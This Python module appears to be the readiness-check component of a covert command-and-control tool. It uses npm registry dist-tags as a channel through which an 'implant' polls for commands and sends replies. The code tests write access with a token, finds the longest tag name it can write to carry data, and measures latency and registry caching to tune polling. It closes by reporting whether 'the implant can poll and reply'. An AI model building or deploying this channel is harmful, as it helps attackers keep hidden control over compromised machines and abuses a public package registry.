"""Deployment readiness check: can this channel actually run commands?

Answers, with live requests against the real registry:
  1. is the token shaped like a granular npm token
  2. does the package exist and is it readable without auth
  3. can this token write a dist-tag on this package
  4. how long a tag name does the registry accept
  5. what is the round-trip latency per request
  6. does a write become visible immediately, or is it cached
"""
from __future__ import annotations

import os
import time

import requests

from . import API, UA, TAG_VALUE, MAX_TAG_LEN, registry_path

PROBE_PREFIX = "zzprobe-"


class Check:
    def __init__(self, name, ok, detail="", fatal=False):
        self.name = name
        self.ok = ok
        self.detail = detail
        self.fatal = fatal

    def __str__(self):
        mark = "ok  " if self.ok else ("FAIL" if self.fatal else "warn")
        return f"[{mark}] {self.name:34} {self.detail}"


def doctor(package, token, base=None, verbose=True):
    """Run every readiness check, print the report, return the checks."""
    checks = _run_checks(package, token, base)
    if verbose:
        _report(checks)
    return checks


def _report(checks):
    pending = [c for c in checks if not c.ok]
    for c in checks:
        print(c)
    print()
    if any(c.fatal for c in pending):
        print("[-] not ready: fix the FAIL lines above")
    elif pending:
        print("[!] usable, with warnings")
    else:
        print("[+] ready: the implant can poll and reply")


def _run_checks(package, token, base=None):
    """Collect the checks; no printing, so callers can reuse the results."""
    api = base or API
    url = api.format(registry_path(package))
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    checks: list[Check] = []

    # 1. token shape ---------------------------------------------------------
    if not token:
        checks.append(Check("token present", False, "no token: read-only implant",
                            fatal=False))
    elif token.startswith("npm_"):
        checks.append(Check("token shape", True, "npm_* granular token"))
    else:
        checks.append(Check("token shape", False,
                            f"does not start with 'npm_' ({len(token)} chars)",
                            fatal=False))

    # 2. package readable without auth --------------------------------------
    anon = requests.Session()
    anon.headers.update({"User-Agent": UA})
    t0 = time.time()
    try:
        r = anon.get(url, timeout=20)
        dt = time.time() - t0
    except requests.RequestException as e:
        checks.append(Check("package reachable", False, str(e)[:60], fatal=True))
        return checks
    if r.status_code == 200:
        try:
            n = len(r.json())
        except ValueError:
            n = 0
        checks.append(Check("package reachable (no auth)", True,
                            f"{n} tag(s), {dt * 1000:.0f} ms"))
    elif r.status_code == 404:
        checks.append(Check("package reachable (no auth)", False,
                            "404: does the package exist and is it public?",
                            fatal=True))
    else:
        checks.append(Check("package reachable (no auth)", False,
                            f"HTTP {r.status_code}", fatal=True))
    checks.append(Check("read latency", dt < 2.0, f"{dt * 1000:.0f} ms per GET",
                        fatal=False))

    if not token:
        return checks

    s.headers["Authorization"] = f"Bearer {token}"

    # 3. can this token write ------------------------------------------------
    probe = f"{PROBE_PREFIX}{os.urandom(3).hex()}"
    try:
        w = s.put(f"{url}/{probe}", json=TAG_VALUE, timeout=20)
    except requests.RequestException as e:
        checks.append(Check("token can write a dist-tag", False, str(e)[:60],
                            fatal=True))
        return checks
    if w.status_code in (200, 201):
        checks.append(Check("token can write a dist-tag", True, "PUT accepted"))
    elif w.status_code in (401, 403):
        why = (w.json().get("error") if w.content else "") or w.text[:80]
        checks.append(Check("token can write a dist-tag", False,
                            f"HTTP {w.status_code} {str(why)[:70]}", fatal=True))
        return checks
    else:
        checks.append(Check("token can write a dist-tag", False,
                            f"HTTP {w.status_code}", fatal=True))
        return checks

    # 4. how long a tag the registry accepts --------------------------------
    longest = None
    for size in (250, 214, 190, 150, 100):
        name = f"{PROBE_PREFIX}{'a' * (size - len(PROBE_PREFIX))}"
        try:
            rr = s.put(f"{url}/{name}", json=TAG_VALUE, timeout=20)
        except requests.RequestException:
            continue
        if rr.status_code in (200, 201):
            longest = size
            s.delete(f"{url}/{name}", timeout=20)
            break
    if longest:
        checks.append(Check("max tag name length", True,
                            f"accepted {longest} chars (MAX_TAG_LEN={MAX_TAG_LEN})"))
        if longest < MAX_TAG_LEN:
            checks.append(Check("MAX_TAG_LEN fits the registry", False,
                                f"set MAX_TAG_LEN={longest}: the default is too long",
                                fatal=False))
        else:
            checks.append(Check("MAX_TAG_LEN fits the registry", True,
                                f"{MAX_TAG_LEN} accepted"))
    else:
        checks.append(Check("max tag name length", False,
                            "no probe length accepted", fatal=False))

    # 5. write visible immediately, or cached? ------------------------------
    visible = None
    for attempt in range(6):
        try:
            g = anon.get(url, timeout=20)
            if g.status_code == 200 and probe in g.json():
                visible = attempt
                break
        except requests.RequestException:
            pass
        time.sleep(1)
    if visible is None:
        checks.append(Check("write visible to a reader", False,
                            "not visible after 6 s: GET is cached; raise the "
                            "poll interval above the cache TTL", fatal=False))
    elif visible == 0:
        checks.append(Check("write visible to a reader", True, "immediately"))
    else:
        checks.append(Check("write visible to a reader", True,
                            f"after ~{visible} s (cache)"))
        checks.append(Check("poll interval above cache TTL", True,
                            "keep --interval >= 10", fatal=False))

    # cleanup ---------------------------------------------------------------
    try:
        s.delete(f"{url}/{probe}", timeout=20)
    except requests.RequestException:
        pass

    return checks
